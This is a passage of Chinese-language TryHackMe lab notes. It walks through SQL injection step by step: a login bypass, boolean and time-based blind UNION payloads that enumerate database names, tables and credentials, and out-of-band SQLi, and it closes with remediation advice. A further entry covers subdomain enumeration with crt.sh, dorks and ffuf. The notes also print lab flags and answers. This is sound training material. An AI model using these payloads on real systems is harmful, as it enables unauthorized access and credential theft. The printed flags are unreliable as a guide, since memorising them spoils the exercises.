<p>考虑到上述信息，我们在此处没有必要枚举有效的用户名以及密码值，我们只需要构建一个以 yes&#x2F;true 作为回复的数据库查询语句即可。</p>
<p><strong>练习</strong></p>
<p>进入SQL 注入实验的关卡二，我们可以在标有“SQL查询”的框中看到对数据库的原始查询如下：</p>
<blockquote>
<p>select * from users where username&#x3D;’%username%’ and password&#x3D;’%password%’ LIMIT 1;</p>
</blockquote>
<p>注意：%username% 和 %password% 值都将取自登录表单中的输入字段，在此处SQL 查询框中的初始值将为空，因为这些字段当前在登录表单中输入为空。</p>
<p>为了使上述查询成为一个始终返回 true 的查询，我们可以在登录表单的密码字段中输入以下内容：</p>
<blockquote>
<p>‘ OR 1&#x3D;1;–</p>
</blockquote>
<p>然后在登录表单的用户名字段输入随机内容，以输入 1 为例。</p>
<p>通过完成以上操作将使之前的 SQL 查询变成以下内容：</p>
<blockquote>
<p>select * from users where username&#x3D;’1’ and password&#x3D;’’ OR 1&#x3D;1;</p>
</blockquote>
<p>因为 1&#x3D;1 是一个 true 语句并且我们还使用了 OR 运算符，所以这条查询语句将始终导致SQL查询的返回结果始终为 true，这就满足 web 应用程序逻辑，即web应用程序会认为数据库已经找到了有效的用户名&#x2F;密码组合 然后将允许我们成功通过登录验证机制 。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221129000353877.png"
                      alt="image-20221129000353877"
                ></p>
<p>查看关卡二的原始查询界面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221129000304762.png"
                      alt="image-20221129000304762"
                ></p>
<p>在用户名框输入1或者其他字符，在密码框中输入payload <code>&#39; OR 1=1;--</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221128235828877.png"
                      alt="image-20221128235828877"
                ></p>
<p>点击登录，出现以下界面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221129000018422.png"
                      alt="image-20221129000018422"
                ></p>
<p>获取SQL实验关卡二的flag（转到第三关即可查看关卡二的flag）：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221129000151958.png"
                      alt="image-20221129000151958"
                ></p>
<blockquote>
<p>THM{SQL_INJECTION_9581}</p>
</blockquote>
<h2 id="SQL盲注—基于布尔"><a href="#SQL盲注—基于布尔" class="headerlink" title="SQL盲注—基于布尔"></a>SQL盲注—基于布尔</h2><p><strong>基于布尔的SQL盲注</strong></p>
<p>基于布尔的 SQL 注入是指：当我们经过注入尝试之后，所收到的响应可能为 true&#x2F;false、yes&#x2F;no、on&#x2F;off、1&#x2F;0 或其他任何只会有两个结果的响应消息。布尔值所对应的结果将向我们确认 SQL 注入payload是否执行成功，你可能会觉得这种有限的回答无法提供太多信息，但实际上，仅通过两种响应结果，我们就可以枚举整个数据库结构和内容。</p>
<p><strong>练习</strong></p>
<p>在 SQL 注入实验的第三关，你将看到一个具有以下 URL 的模拟浏览器：</p>
<blockquote>
<p><a class="link"   href="https://website.thm/checkuser?username=admin" >https://website.thm/checkuser?username=admin <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>浏览器主体还包含其他内容： <code>&#123;&quot;taken&quot;:true&#125;</code> 。 这个 API 端点对应的是许多注册表单上的一个常见功能，即检查用户名是否已注册 以提示用户是否应该重新选择不同的用户名；因为此处的取值为 true，所以我们可以假设用户名 admin 已经被注册。 事实上，我们也可以通过将模拟浏览器地址栏中的用户名从 admin 更改为 admin123 来确认这一点，修改用户名之后按下回车键，如果你看到taken值更改为 false，则代表用户名admin123未注册，相对应地我们就能知道之前显示的用户名admin已经被注册了。</p>
<p>该关卡提供的原始 SQL 查询语句如下所示：</p>
<blockquote>
<p>select * from users where username &#x3D; ‘%username%’ LIMIT 1;</p>
</blockquote>
<p>我们可以控制查询字符串中的用户名，因为它是唯一的用户输入点，所以我们将不得不使用它来执行我们的 SQL 注入攻击。 将用户名设置为 admin123，此时所对应的taken值为false，我们可以尝试在admin123后面附加SQL注入payload，直到将 taken 字段的状态从 false 更改为 true。</p>
<p>与之前的关卡一样，我们的首要任务是先确定用户表的列数，我们可以使用 UNION 语句来实现，尝试将用户名对应的值更改为以下内容：</p>
<blockquote>
<p>admin123’ UNION SELECT 1;– </p>
</blockquote>
<p>由于 Web 应用程序响应的taken值为 false，因此我们可以确认列数 1 不是正确的列值，我们可以继续添加更多列，直到我们得到的taken值为 true 。你可以通过将用户名设置为以下值来确认用户表实际的列数为 3 ：</p>
<blockquote>
<p>admin123’ UNION SELECT 1,2,3;– </p>
</blockquote>
<p>现在我们已经确定用户表的列数，我们可以进行关于目标数据库的枚举操作。我们的首要任务是发现数据库名称，为此，我们可以使用<code>database()</code>方法，然后使用 <code>like</code>运算符尝试查找将返回taken值为true状态的结果。</p>
<p>尝试使用下面的用户名值，看看会发生什么：</p>
<blockquote>
<p>admin123’ UNION SELECT 1,2,3 where database() like ‘%’;–</p>
</blockquote>
<p>我们得到一个true的响应，因为在<code>like</code>运算符中，我们只提供了<code>%</code>的值，<code>%</code>是通配符值，它将匹配任何东西。 如果我们将通配符更改为<code>a%</code>，你将看到响应的返回值为false，这说明目标数据库名称不是以字母 a 开头；我们可以循环遍历所有字母、数字和字符，例如字符<code>-</code> 和 <code>_</code>，直到找到匹配项为止。 </p>
<p>如果你将以下payload内容作为用户名值发送，你将收到一个返回值为true的响应，这说明数据库名称是以字母<code>s</code>开头的。</p>
<blockquote>
<p>admin123’ UNION SELECT 1,2,3 where database() like ‘s%’;–</p>
</blockquote>
<p>现在你需要移动到数据库名称的下一个字符继续使用通配符，直到找到另一个返回值为true的响应，例如“<code>sa%</code>”、“<code>sb%</code>”、“<code>sc%</code>”等；重复以上过程，直到你发现数据库名称的所有字符为止，最终我们成功得到了目标数据库的名称，即 <em><strong>sqli_three</strong></em> 。</p>
<p>我们已经知道了数据库名称，我们可以继续使用<code>information_schema</code>信息数据库通过类似的方法来枚举表的名称，尝试将用户名设置为以下值：</p>
<blockquote>
<p>admin123’ UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema &#x3D; ‘sqli_three’ and table_name like ‘a%’;–</p>
</blockquote>
<p>以上查询语句将在 <em><strong>information_schema</strong></em> 信息数据库中查找 数据库名称为 <em><strong>sqli_three</strong></em> 且表名称以字母a开头的tables表的结果。由于上述查询结果为false响应，我们可以确认 <em><strong>sqli_three</strong></em> 数据库中没有以字母<strong>a</strong>开头的表；像之前一样，你需要循环遍历字母、数字和字符，直到找到完整的匹配项。</p>
<p>最终我们在 <em><strong>sqli_three</strong></em> 数据库中发现一个名为 <em><strong>users</strong></em> 的表，你可以通过运行以下payload来确认：</p>
<blockquote>
<p>admin123’ UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema &#x3D; ‘sqli_three’ and table_name&#x3D;’users’;–</p>
</blockquote>
<p>最后，我们需要枚举 <em><strong>users</strong></em> 表中的 列(字段) 名，以便我们可以正确地在其中搜索用户的登录凭据。我们再次使用 <em><strong>information_schema</strong></em> 信息数据库并结合我们已经获得的信息，开始查询 <em><strong>users</strong></em> 表的列名。 使用下面的payload，我们可以搜索数据库名称为<em><strong>sqli_three</strong></em>，表名为<em><strong>users</strong></em>，并且列名以字母a开头的列信息表。</p>
<blockquote>
<p>admin123’ UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA&#x3D;’sqli_three’ and TABLE_NAME&#x3D;’users’ and COLUMN_NAME like ‘a%’;–</p>
</blockquote>
<p>同样，你需要循环遍历字母、数字和字符，直到找到匹配项。 当你正在匹配多个查询结果时，你必须在每次找到新的列名时将其添加到你的payload中，这样你就不会一直发现相同的结果；例如，当你找到名为 id 的列后，你需要将其附加到原始的payload中（如下所示），以便继续查找下一个列名。</p>
<blockquote>
<p>admin123’ UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA&#x3D;’sqli_three’ and TABLE_NAME&#x3D;’users’ and COLUMN_NAME like ‘a%’ and COLUMN_NAME !&#x3D;’id’;–</p>
</blockquote>
<p>重复上述过程，你最终能够发现 <em><strong>users</strong></em> 表中的所有列名为 <code>id</code>、<code>username</code> 和 <code>password</code>。 现在我们可以使用列名来查询 <em><strong>users</strong></em> 表的内容以获取有效登录凭据；首先，你需要发现一个有效的用户名，你可以尝试使用下面的payload：</p>
<blockquote>
<p>admin123’ UNION SELECT 1,2,3 from users where username like ‘a%’;–</p>
</blockquote>
<p>继续循环遍历所有字符，你将确认用户名 <em><strong>admin</strong></em> 的存在。知道了有效的用户名之后，我们需要继续发现该用户名所对应的密码值，下面的payload向你展示了如何找到用户名 <em><strong>admin</strong></em> 所对应的密码值：</p>
<blockquote>
<p>admin123’ UNION SELECT 1,2,3 from users where username&#x3D;’admin’ and password like ‘a%’;–</p>
</blockquote>
<p>使用上面的payload，循环遍历所有字符，你会发现该密码值为<em><strong>3845</strong></em>。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221129000725560.png"
                      alt="image-20221129000725560"
                ></p>
<p>查看关卡三的原始查询界面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221129191313262.png"
                      alt="image-20221129191313262"
                ></p>
<p>确认原始查询所用的表中的列数：</p>
<blockquote>
<p>admin123’ UNION SELECT 1,2,3;– </p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221129191814044.png"
                      alt="image-20221129191814044"
                ></p>
<p>查询数据库的名称（通过使用’%’通配符进行猜解）：</p>
<blockquote>
<p>admin123’ UNION SELECT 1,2,3 where database() like ‘sqli_three’;–</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221129191729735.png"
                      alt="image-20221129191729735"
                ></p>
<p>查找表名（通过使用’%’通配符进行猜解）：</p>
<blockquote>
<p>admin123’ UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema &#x3D; ‘sqli_three’ and table_name&#x3D;’users’;–</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221129192007733.png"
                      alt="image-20221129192007733"
                ></p>
<p>查找表中的列名（通过使用’%’通配符进行猜解）：</p>
<blockquote>
<p>admin123’ UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA&#x3D;’sqli_three’ and TABLE_NAME&#x3D;’users’ and COLUMN_NAME like ‘id’;–</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221129192732656.png"
                      alt="image-20221129192732656"
                ></p>
<blockquote>
<p>admin123’ UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA&#x3D;’sqli_three’ and TABLE_NAME&#x3D;’users’ and COLUMN_NAME like ‘username’ and COLUMN_NAME !&#x3D;’id’;–</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221129193517468.png"
                      alt="image-20221129193517468"
                ></p>
<blockquote>
<p>admin123’ UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA&#x3D;’sqli_three’ and TABLE_NAME&#x3D;’users’ and COLUMN_NAME like ‘password’ and COLUMN_NAME !&#x3D;’id’ and COLUMN_NAME !&#x3D;’username’;–</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221129193626151.png"
                      alt="image-20221129193626151"
                ></p>
<p>查找表中的一个有效用户名（通过使用’%’通配符进行猜解）：</p>
<blockquote>
<p>admin123’ UNION SELECT 1,2,3 from users where username like ‘admin’;–</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221129193756774.png"
                      alt="image-20221129193756774"
                ></p>
<p>查找表中的有效用户名所对应的密码（通过使用’%’通配符进行猜解）：</p>
<blockquote>
<p>admin123’ UNION SELECT 1,2,3 from users where username&#x3D;’admin’ and password like ‘3845’;–</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221129193845300.png"
                      alt="image-20221129193845300"
                ></p>
<p>在登录表单中输入获取的用户名和密码值，进行登录操作：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221129194026441.png"
                      alt="image-20221129194026441"
                ></p>
<p>进入关卡四，获取关卡三的flag：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221129194136336.png"
                      alt="image-20221129194136336"
                ></p>
<blockquote>
<p>THM{SQL_INJECTION_1093}</p>
</blockquote>
<h2 id="SQL盲注—基于时间"><a href="#SQL盲注—基于时间" class="headerlink" title="SQL盲注—基于时间"></a>SQL盲注—基于时间</h2><p><strong>基于时间的SQL盲注</strong></p>
<p>基于时间的 SQL 注入与上述基于布尔值的SQL注入非常相似，也会发送相同的请求，但是在此处并没有视觉指示器来表明你的查询是对还是错，在时间盲注中，一个正确的SQL查询的指标完全基于该查询完成所需要的时间长短。</p>
<p>时间延迟的查询效果是通过使用内置方法（例如 <code>SLEEP(x)</code>）以及 <code>UNION</code> 语句来实现的，<code>SLEEP()</code>方法只会在 <code>UNION SELECT</code> 语句查询成功时执行。</p>
<p>因此，当我们想确定原始查询所用表的具体列数时，可以使用以下查询：</p>
<blockquote>
<p>admin123’ UNION SELECT SLEEP(5);–</p>
</blockquote>
<p>如果以上查询的响应时间很短，我们就能知道查询是不成功的，所以我们需要添加列数并继续尝试：</p>
<blockquote>
<p>admin123’ UNION SELECT SLEEP(5),2;–</p>
</blockquote>
<p>以上payload在得到响应时，产生了 5 秒左右的时间延迟，这就说明了<code>UNION SELECT </code>语句已经成功执行并且 我们可以得知原始查询所用的表一共有两列。</p>
<p>你现在可以参考之前在布尔盲注中所使用的payload 来完成重复枚举过程，将 <code>SLEEP()</code> 方法添加到 <code>UNION SELECT</code> 语句中即可。</p>
<p>如果你想查找数据库名称，请参考下面的查询以提供你一些帮助：</p>
<blockquote>
<p>referrer&#x3D;admin123’ UNION SELECT SLEEP(5),2 where database() like ‘u%’;–</p>
</blockquote>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221129000737897.png"
                      alt="image-20221129000737897"
                ></p>
<p>查看关卡四的原始查询语句，选择url一栏按下回车键即可：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221129194840259.png"
                      alt="image-20221129194840259"
                ></p>
<p>在url中使用以下payload来猜解表的列数：</p>
<blockquote>
<p>admin123’ UNION SELECT SLEEP(5);–</p>
<p>admin123’ UNION SELECT SLEEP(5),2;–</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221129194607119.png"
                      alt="image-20221129194607119"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221129194712887.png"
                      alt="image-20221129194712887"
                ></p>
<p>参考之前在布尔盲注中所使用的payload来完成对目标数据库的重复枚举过程（通过使用’%’通配符进行猜解），以下只给出查找数据库名称时所用的payload以及最终查询时所用的payload：</p>
<blockquote>
<p>admin123’ UNION SELECT SLEEP(5),2 where database() like ‘sqli_four’;–</p>
<p>admin123’ UNION SELECT SLEEP(5),2 from users where username like ‘admin’ and password like ‘4961’;–</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221129200654669.png"
                      alt="image-20221129200654669"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221129201303131.png"
                      alt="image-20221129201303131"
                ></p>
<p>输入刚才查询得到的正确用户名和密码，获取关卡四的flag：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221129201747707.png"
                      alt="image-20221129201747707"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221129201807161.png"
                      alt="image-20221129201807161"
                ></p>
<blockquote>
<p>THM{SQL_INJECTION_MASTER}</p>
</blockquote>
<h2 id="带外SQLi（SQL-injection）"><a href="#带外SQLi（SQL-injection）" class="headerlink" title="带外SQLi（SQL injection）"></a>带外SQLi（SQL injection）</h2><p>带外(Out-of-Band) SQL 注入并不常见，因为它取决于数据库服务器上启用的特定功能或 Web 应用程序的业务逻辑，带外SQL注入攻击能根据 SQL 查询的结果进行某种外部网络调用。</p>
<p>带外SQL注入攻击可分为两种不同的通信渠道，其中一种将用于发起注入攻击，另一种则用于收集攻击结果。 例如，攻击渠道可能是通过 Web 请求，而数据收集渠道可能是通过监控 针对你所控制的服务器而发出的 HTTP&#x2F;DNS 请求。</p>
<ol>
<li>攻击者使用SQL注入payload向存在SQLi漏洞的目标网站发出 Web 请求。</li>
<li>目标网站对数据库进行 SQL 查询操作，相关的查询语句会加载攻击者所使用的payload。</li>
<li>攻击者所使用的payload中另外还包含了一个请求，该请求会强制将 包含来自目标服务器数据库的数据的HTTP请求 返回到攻击机上。</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221128232411773.png"
                      alt="image-20221128232411773"
                ></p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221128232432501.png"
                      alt="image-20221128232432501"
                ></p>
<h2 id="SQL注入漏洞修复"><a href="#SQL注入漏洞修复" class="headerlink" title="SQL注入漏洞修复"></a>SQL注入漏洞修复</h2><p><strong>漏洞修复</strong></p>
<p>由于SQL 注入漏洞的影响力，开发人员可以通过遵循下面的一些建议来保护他们的 Web 应用程序免受侵害。</p>
<p><strong>预编译语句（使用参数化查询）：</strong></p>
<p>在预编译查询中，开发人员首先编写的是 SQL 查询语句，然后再将任何用户输入都添加为查询语句中的参数。 编写预编译语句可以确保 SQL 代码结构不发生变化，并且数据库也可以更好地区分查询和数据，使用预编译语句还将让你的代码看起来更简洁且更易于阅读。</p>
<p><strong>对外部输入进行验证：</strong></p>
<p>输入验证处理可以大大保护输入到 SQL 查询语句中的内容。 通过建立允许列表(白名单)可以将输入限制为仅允许某些字符串，或者通过使用编程语言中的字符串替换方法来过滤一些你允许的字符或不允许的字符。</p>
<p><strong>转义用户输入：</strong></p>
<p>允许用户输入包含诸如 <code>&#39; &quot; $ \</code> 之类的特殊字符可能会导致 SQL 查询中断，或者更糟糕的是 攻击者可通过输入这些字符以进行SQL注入攻击；转义用户输入的方法是在这些特殊字符前面加上反斜杠 (<code>\</code>) 字符，然后就能将这些字符作为常规字符串处理而不是作为特殊字符进行解析。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221128221637823.png"
                      alt="image-20221128221637823"
                ></p>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Subdomain Enumeration(子域名枚举)-学习</title>
    <url>/2024/01/27/THM-Subdomain%20Enumeration(%E5%AD%90%E5%9F%9F%E5%90%8D%E6%9E%9A%E4%B8%BE)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/subdomainenumeration" >https://tryhackme.com/room/subdomainenumeration <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文相关的内容：学习如何发现目标子域的各种方法，以便扩展我们针对目标的攻击面。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p> 子域名枚举是为一个域查找有效子域的过程，在本节中我们将学习发现子域的各种方法，我们这样做是为了扩大我们的攻击面，试图发现更多潜在的漏洞点。</p>
<p>我们将探讨三种不同的子域枚举方法: Brute Force、 OSINT (开放来源情报)和 Virtual Host（虚拟主机）</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221004192342215.png"
                      alt="image-20221004192342215"
                ></p>
<h2 id="OSINT-SSL-TLS证书"><a href="#OSINT-SSL-TLS证书" class="headerlink" title="OSINT - SSL&#x2F;TLS证书"></a>OSINT - SSL&#x2F;TLS证书</h2><p><strong>SSL&#x2F;TLS 证书</strong></p>
<p>当 SSL&#x2F;TLS（Secure Sockets Layer&#x2F;Transport Layer Security）证书 由 CA（Certificate Authority 数字证书认证机构）颁发给某个域名时，CA 会参与所谓的“证书透明度(CT)日志”。这些日志是 被颁发给一些域名的每个 SSL&#x2F;TLS 证书 的公共访问日志。</p>
<p>证书透明度日志存在的目的 是为了阻止恶意和意外创建的证书被使用，我们可以利用这项服务 来发现属于一个域名的子域名,我们可以通过在线网站 <a class="link"   href="http://crt.sh/" >http://crt.sh/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 以及 <a class="link"   href="https://ui.ctsearch.entrust.com/ui/ctsearchui" >https://ui.ctsearch.entrust.com/ui/ctsearchui <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 所提供的一个可搜索的证书数据库，来查找某个证书的当前和历史记录。</p>
<p><strong>答题</strong></p>
<p>使用 <a class="link"   href="http://crt.sh/" >http://crt.sh/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 搜索域名 tryhackme.com ，找到2020-12-26的记录并查看登记的子域名。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221004195234190.png"
                      alt="image-20221004195234190"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221004194238528.png"
                      alt="image-20221004194238528"
                ></p>
<h2 id="OSINT-搜索引擎"><a href="#OSINT-搜索引擎" class="headerlink" title="OSINT - 搜索引擎"></a>OSINT - 搜索引擎</h2><p><strong>搜索引擎</strong></p>
<p>搜索引擎包含数万亿个链接，指向超过 10 亿个网站，是寻找子域名的绝佳途径。在 Google 等网站上使用高级搜索方法，如site:filter，可以缩小搜索结果。</p>
<p>例子：“-site:<a class="link"   href="http://www.domain.com/" >www.domain.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> site:*.domain.com”只会包含指向域名 domain.com 的结果，但同时会排除任何指向 <a class="link"   href="http://www.domain.com/" >www.domain.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的链接；所以，它只会向我们显示属于 domain.com 的子域名。</p>
<p>转到谷歌并使用搜索词 -site:<a class="link"   href="http://www.tryhackme.com/" >www.tryhackme.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> site:*.tryhackme.com ，搜索结果应该会显示 tryhackme.com 的子域名。</p>
<p><strong>答题</strong></p>
<p>在Google上使用高级语法，搜索tryhackme.com的子域名</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221004201631885.png"
                      alt="image-20221004201631885"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221004192934157.png"
                      alt="image-20221004192934157"
                ></p>
<h2 id="DNS-Bruteforce（DNS-暴力匹配）"><a href="#DNS-Bruteforce（DNS-暴力匹配）" class="headerlink" title="DNS Bruteforce（DNS 暴力匹配）"></a>DNS Bruteforce（DNS 暴力匹配）</h2><p>Bruteforce DNS (域名系统)枚举是从预定义的常用子域名字典中，尝试向DNS请求数十个、数百个、数千个甚至数百万个不同可能的子域名的方法，因为这个方法需要很多请求，所以我们使用工具来自动化完成，以加快处理速度。</p>
<p>在本例中，我们会使用一个名为 dnsrecon 的工具来执行此操作。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221004202727107.png"
                      alt="image-20221004202727107"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221004202746302.png"
                      alt="image-20221004202746302"
                ></p>
<h2 id="OSINT-Sublist3r"><a href="#OSINT-Sublist3r" class="headerlink" title="OSINT-Sublist3r"></a>OSINT-Sublist3r</h2><p><strong>使用 Sublist3r 自动化工具</strong></p>
<p>为了加快 OSINT 子域发现的进程，我们可以使用 Sublist3r 这样的工具来自动化查找子域。</p>
<p>Sublist3r项目地址：<a class="link"   href="https://github.com/aboul3la/Sublist3r" >https://github.com/aboul3la/Sublist3r <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221004203140515.png"
                      alt="image-20221004203140515"
                ><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221004203205370.png"
                      alt="image-20221004203205370"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221004203235694.png"
                      alt="image-20221004203235694"
                ></p>
<h2 id="Virtual-Hosts-虚拟主机"><a href="#Virtual-Hosts-虚拟主机" class="headerlink" title="Virtual Hosts 虚拟主机"></a>Virtual Hosts 虚拟主机</h2><p>有些子域名并不总是托管在公共可访问的 DNS 的结果中，例如 Web 应用程序的开发版本或一些管理门户。</p>
<p>DNS 记录也可以保存在一个私有的 DNS 服务器上，或者记录在开发者的机器上的 &#x2F;etc&#x2F;hosts 文件中(或者在c:\windows\system32\drivers\etc\hosts 文件中，Windows 用户可以使用这个文件)，hosts能将域名映射到 IP 地址。</p>
<p>Web 服务器可以在一台服务器上托管多个网站，当客户端请求网站时，服务器能从 Host 标头中知道客户端具体想要访问哪一个网站。我们可以通过更改Host信息来利用这个Host标头，并监控服务器的响应以查看我们是否发现了一个新网站。</p>
<p>与 DNS 的暴力匹配一样，我们可以通过使用包含常用子域名的字典来自动化请求过程。</p>
<p>启动TryHackMe网站提供的AttackBox，然后对 Acme IT Support 机器尝试以下命令，以尝试发现一个新的子域。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">user@machine$ </span><span class="language-bash">ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H <span class="string">&quot;Host: FUZZ.acmeitsupport.thm&quot;</span> -u http://10.10.91.202</span></span><br></pre></td></tr></table></figure></div>

<p>上面的命令使用 -w 开关来指定我们要使用的字典，使用 -H 开关来添加&#x2F;编辑标头（在本例中为 Host 标头），我们在子域名的url地址中能够插入一个FUZZ关键字，在这个位置，我们将尝试填充字典中的所有子项。</p>
<p>因为上面的命令总是会产生一个有效的结果，所以我们需要做过滤输出。我们可以使用-fs 开关 加上所得结果的”页面大小值” 来做过滤。</p>
<p>编辑并执行以下命令，将 {size} 替换为上一个命令的结果中出现次数最多的”页面大小值”。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">user@machine$ </span><span class="language-bash">ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H <span class="string">&quot;Host: FUZZ.acmeitsupport.thm&quot;</span> -u http://10.10.91.202 -fs &#123;size&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>除了 -fs 开关之外，此命令的语法与第一个命令类似，使用-fs 将告诉 ffuf 忽略任何指定大小的结果。</p>
<p><strong>答题</strong></p>
<p>使用命令</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H &quot;Host: FUZZ.acmeitsupport.thm&quot; -u http://10.10.91.202</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">对上一条命令的结果进行过滤 忽略出现次数最多的size值：2395</span></span><br><span class="line">ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H &quot;Host: FUZZ.acmeitsupport.thm&quot; -u http://10.10.91.202 -fs 2395</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221004215342054.png"
                      alt="image-20221004215342054"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221004214643166.png"
                      alt="image-20221004214643166"
                ></p>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>工具使用</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Upload Vulnerabilities(文件上传漏洞)-学习</title>
    <url>/2024/01/27/THM-Upload%20Vulnerabilities(%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/uploadvulns" >https://tryhackme.com/room/uploadvulns <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文相关内容：探索Web应用程序(即Web网站)中的一些基本的文件上传漏洞。</p>
<h2 id="配置在线练习环境"><a href="#配置在线练习环境" class="headerlink" title="配置在线练习环境"></a>配置在线练习环境</h2><p>使用你喜欢的文本编辑器，打开设备上的 hosts 文件:</p>
